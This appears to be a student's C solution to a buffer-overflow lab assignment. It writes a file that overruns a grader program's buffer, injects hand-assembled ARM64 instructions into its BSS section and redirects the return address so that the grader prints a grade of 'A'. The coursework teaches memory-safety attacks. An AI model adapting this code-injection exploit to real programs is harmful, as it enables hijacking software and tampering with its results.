/*--------------------------------------------------------------------*/
/* createdataA.c                                                      */
/* Author: Richard Gomez                                              */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <stdlib.h>
#include "miniassembler.h"

/* main takes no arguments and writes a series of characters that cause
   a buffer overun of the grader program. These characters cause an 
   incorrect output, specifically to give a grade of 'A', to be printed.
   The characters are printed to a file named dataA. Returns 0 */

int main(void) {
    unsigned long bssAddress;
    unsigned int movInstruction;
    unsigned int adrInstruction;
    unsigned int strbInstruction;
    unsigned int bInstruction;
    int i;

    FILE *psFile;
    psFile = fopen("dataA", "w");

    /* Student name is printed to output file */
    fprintf(psFile, "Richard Gomez");
    
    /* Null character to ensure correctness */
    putc('\0', psFile);

    /* Additional null chracters to ensure instructions end on multiple
       of 4 */
    putc('\0', psFile);
    putc('\0', psFile);

    /* adr x0, grade */
    adrInstruction = MiniAssembler_adr(0, 0x420044, 0x420068);
    fwrite(&adrInstruction, sizeof(unsigned int), 1, psFile);

    /* mov w1, 'A' */
    movInstruction = MiniAssembler_mov(1, 'A');
    fwrite(&movInstruction, sizeof(unsigned int), 1, psFile);
    
    /* strb w1, [x0] */
    strbInstruction = MiniAssembler_strb(1, 0);
    fwrite(&strbInstruction, sizeof(unsigned int), 1, psFile);
    
    /* b printf */
    bInstruction = MiniAssembler_b(0x400864, 0x420074);
    fwrite(&bInstruction, sizeof(unsigned int), 1, psFile);

    /* Additional null characters to overrun the buffer */
    for(i = 0; i < 16; i++) {
        putc('\0', psFile);
    }

    /* The address of the BSS section where the adr instruction is */
    bssAddress = 0x420068;
    fwrite(&bssAddress, sizeof(unsigned long), 1, psFile);

    fclose(psFile);
    return 0;
}